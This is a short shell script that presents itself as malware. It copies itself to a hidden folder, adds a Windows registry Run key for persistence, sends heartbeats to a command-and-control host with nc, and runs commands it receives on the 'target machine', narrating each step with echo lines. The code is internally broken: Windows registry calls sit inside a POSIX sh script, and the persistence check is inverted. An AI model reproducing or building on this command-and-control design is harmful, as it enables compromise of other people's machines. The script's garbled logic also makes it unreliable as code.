#!/bin/sh

persist() {
  echo Copying malware to hidden folder...
  cp $0 /root/hidden/$0 &> /dev/null
  echo Adding startup key to registry...
  reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Run /t REG_SZ /d \"$0\" &> /dev/null
}

beacon() {
  while :; do
    echo Sending heartbeat packet to C2 server...
    nc -4u $C2_IP $C2_PORT &> /dev/null
    sleep 30
  done
}

poll_commands() {
  while true; do
    echo Waiting for command from C2 server...
    read cmd < /root/hidden/$0 &> /dev/null
    echo Executing command on target machine...
    `$cmd` | tee /dev/null > /tmp/output.txt
  done
}

if [ -f /root/hidden/$0 ]; then
  persist
  beacon &
  poll_commands
else
  echo Malware not found! Exiting...
fi
